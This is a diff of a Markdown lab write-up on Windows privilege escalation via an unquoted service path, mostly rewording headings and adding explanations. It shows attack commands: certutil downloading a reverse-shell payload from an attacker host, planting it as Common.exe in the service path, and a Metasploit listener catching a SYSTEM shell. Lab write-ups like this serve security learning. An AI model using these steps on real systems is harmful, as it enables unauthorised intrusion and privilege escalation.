@@ -216,7 +216,7 @@ This time, I found `RW BUILTIN\Users`, which means any normal user can write to 
 
 ### Step 3 — Generating a New Payload and Downloading it to the Victim
 
-### Generated Payload on Kali
+### Generate Payload on Kali
 
 After finding a writable folder, I created a new Meterpreter payload using msfvenom.
 
@@ -239,7 +239,7 @@ This created a payload named `rev.exe`.
   <img src="images/step3-1.png" width="600">
 </p>
 
-### Started Python HTTP Server on Kali
+### Start Python HTTP Server on Kali
 
 ```bash
 python3 -m http.server 80
@@ -252,7 +252,9 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.5.144 - - [20/Jun/2026 22:51:35] "GET / HTTP/1.1" 200 -
 ```
 
-### Downloaded the Payload on the Victim Machine
+### Download the Payload on the Victim Machine
+
+On the victim machine, I used `certutil` to download the payload from my Kali machine.
 
 ```bash
 certutil -urlcache -split -f http://192.168.5.128/rev.exe rev.exe
@@ -270,9 +272,13 @@ CertUtil: -URLCache command completed successfully.
   <img src="images/step3-2.png" width="600">
 </p>
 
+The payload was downloaded successfully and saved as rev.exe on the victim machine.S
+
 ## Step 4 — Copying the Payload and Starting the Service
 
-Copied the Payload to the Writable Folder as Common.exe
+### Copied the Payload to the Writable Folder
+
+Since I had write permission on C:\Program Files\Unquoted Path Service\, I copied my payload there and named it `Common.exe.`
 
 ```bash
 copy C:\PrivEsc\rev.exe "C:\Program Files\Unquoted Path Service\Common.exe"
@@ -286,7 +292,9 @@ copy C:\PrivEsc\rev.exe "C:\Program Files\Unquoted Path Service\Common.exe"
   <img src="images/step4-1.png" width="600">
 </p>
 
-Started the Metasploit Listener on Kali
+### Start the Metasploit Listener on Kali
+
+Before starting the service, I started a Metasploit listener to wait for the incoming reverse shell.
 
 ```bash
 msfconsole -q
@@ -315,12 +323,14 @@ msf exploit(multi/handler) > run
   <img src="images/step4-2.png" width="600">
 </p>
 
-Started the Service on the Victim
+### Start the Service
+
+After everything was ready, I started the vulnerable service.
 
 ```bash
 C:\PrivEsc> net start unquotedsvc
 ```
-Windows started the service, looked for the binary, found `Common.exe` first in the writable folder, and ran it as `SYSTEM`.
+When the service started, Windows looked for the executable in the unquoted path. It found `Common.exe` in the writable folder and executed it with `SYSTEM` privileges, causing the reverse connection to my Metasploit listener.
 
 ## Step 5 — Getting a SYSTEM Shell
 
